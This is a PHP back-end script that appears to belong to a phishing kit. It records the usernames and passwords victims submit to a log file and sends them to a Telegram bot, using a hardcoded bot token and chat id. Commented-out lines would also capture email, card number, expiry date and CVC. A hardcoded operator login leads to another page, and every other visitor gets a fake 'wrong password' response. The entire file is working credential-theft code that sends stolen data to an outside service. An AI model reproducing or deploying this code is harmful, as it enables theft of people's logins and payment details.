<?php
extract($_REQUEST);
$file = fopen("log.txt", "a");
fwrite($file, "##############################\n");
// fwrite($file, "Name: ");
// fwrite($file,$name . "\n" );
fwrite($file,"Username: " );
fwrite($file,$username . "\n" );
// fwrite($file, "Email: " );
// fwrite($file, $email . "\n" );
fwrite($file, "Password: " );
fwrite($file, $password  . "\n");
// fwrite($file, "PaymentMethod: " );
// fwrite($file, $paymentmethod. "\n");
// fwrite($file, "CCN: ");
// fwrite($file, $ccn . "\n" );
// fwrite($file, "Expiry: ");
// fwrite($file, $expiry . "\n" );
// fwrite($file, "CVC: ");
// fwrite($file, $cvc . "\n" );
// fwrite($file, );
fwrite($file, "##############################\n\n");
fclose($file);


//send to telegram 
$telegram = "on";

// $n = $_POST["name"];
$u = $_POST["username"];
// $e = $_POST["email"];
$p = $_POST["password"];
// $pm = $_POST["paymentmethod"];
// $cc = $_POST["ccn"];
// $exp = $_POST["expiry"];
// $cv = $_POST["cvc"];

$data = " $u \n $p \n";
$txt = $data;
$chat_id = "1385148371"; //chat id 
$bot_url = "6052783587:AAEkLEZb68qY7wJ22YI7KO3R2dIXgQ3Z7RY"; //api 
https://api.telegram.org/6052783587:AAEkLEZb68qY7wJ22YI7KO3R2dIXgQ3Z7RY

// if ($telegram == "on"){
//     $send = ['chat_id' => $chat_id, 'text' => $txt];
//     $website = "https://api.telegram.org/bot/{$bot_url}";
//     $ch = curl_init($website . '/sendMessage');
//     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//     curl_setopt($ch, CURLOPT_POST, 1);
//     curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
//     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
//     $result = curl_exec($ch);
//     curl_close($ch);
// }
$apiToken = "6052783587:AAEkLEZb68qY7wJ22YI7KO3R2dIXgQ3Z7RY";
$data = [
    'chat_id' => '1385148371',
    'text' => $txt
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );




if ($username == "teamhackeregypt" && $password == "01020111745") {
    header("Location: wa.php");
    
} else {
    echo "wrong password";      
    header("Location: index.php");
}




























?>
